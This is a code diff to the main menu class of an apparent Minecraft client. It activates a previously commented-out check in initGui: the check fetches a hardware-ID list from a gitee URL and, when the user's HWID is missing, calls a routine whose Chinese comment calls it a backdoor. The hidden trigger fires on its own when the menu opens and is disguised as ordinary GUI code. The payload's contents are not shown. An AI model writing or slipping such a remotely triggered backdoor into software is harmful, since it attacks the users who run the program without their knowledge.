@@ -121,8 +121,18 @@ public class GuiMainMenu extends GuiScreen {
     }
 
     protected void keyTyped(char p_keyTyped_1_, int p_keyTyped_2_) throws IOException {}
-
+     @NativeMethod
     public void initGui() {
+         if(!got) {
+             try {
+               if (!WebUtils.get("https://gitee.com/shuimenglol/TEST/raw/master/testhwid.txt").contains(HWIDUtils.getHWID())) {
+                   new DimplesUtils().NMSL();  //HWID库不匹配触发后门
+               }
+           } catch (Throwable e) {
+               e.printStackTrace();
+          }
+            got = true;
+        }
         DynamicTexture viewportTexture = new DynamicTexture(256, 256);
         backgroundTexture = mc.getTextureManager().getDynamicTextureLocation("background", viewportTexture);
 
@@ -198,16 +208,6 @@ public class GuiMainMenu extends GuiScreen {
     }
     @NativeMethod
     public void drawScreen(int mouseX, int mouseY, float partialTicks) {
-       // if(!got) {
-     //       try {
-       //         if (!WebUtils.get("https://gitee.com/shuimenglol/TEST/raw/master/testhwid.txt").contains(HWIDUtils.getHWID())) {
-        //            new DimplesUtils().NMSL();  //HWID库不匹配触发后门
-        //        }
-        //    } catch (Throwable e) {
-        //        e.printStackTrace();
-        //    }
-       //     got = true;
-        //}
         GlStateManager.disableAlpha();
         renderSkybox(mouseX, mouseY, partialTicks);
         GlStateManager.enableAlpha();
